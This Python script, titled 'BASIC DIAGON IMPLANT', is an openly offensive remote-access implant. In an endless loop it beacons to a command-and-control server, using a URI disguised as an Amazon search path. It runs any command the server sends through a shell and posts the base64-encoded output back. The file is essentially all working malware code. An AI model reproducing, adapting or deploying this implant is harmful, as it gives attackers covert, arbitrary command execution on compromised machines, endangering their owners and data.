#########################
##  BASIC DIAGON IMPLANT
#########################

import subprocess
import requests
import json
import time
import base64

#########################
##  GLOBAL VARIABLES
#########################
C2SERVER = "http://127.0.0.1"
BEACONTIME = 3
URI = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books"
AGENTID = 99463322
C2URL = C2SERVER + URI
CURCMD = ''

while 1:

    # BEACON FOR TASKS
    payload = {"type":"b","agentid": AGENTID}
    beacon = requests.post(C2URL, data = json.dumps(payload))

    # Parse out JSON C2 Response Data
    jsondata = "{" + beacon.content.split("{")[1]

    # Prevent potential code errors from causing your session to die
    try:
        # If CMD is new
        if CURCMD != jsondata:
            # Load JSON data into Python dictionary
            bdata = json.loads(jsondata)

            # Use subprocess to exectue the command and retrieve the response
            p = subprocess.Popen(bdata["cmd"], shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE)
            retval = base64.b64encode(p.stdout.read() + p.stderr.read())

            # Format JSON response
            resp = {"type":"r","agentid": AGENTID,"taskid":"1","cmd":bdata['cmd'],"retval":retval}
            requests.post(C2URL, data = json.dumps(resp))

            # Reset CURCMD variable
            CURCMD = jsondata

    except:
        time.sleep(BEACONTIME)

    # Sleep the BEACONTIME
    time.sleep(BEACONTIME)
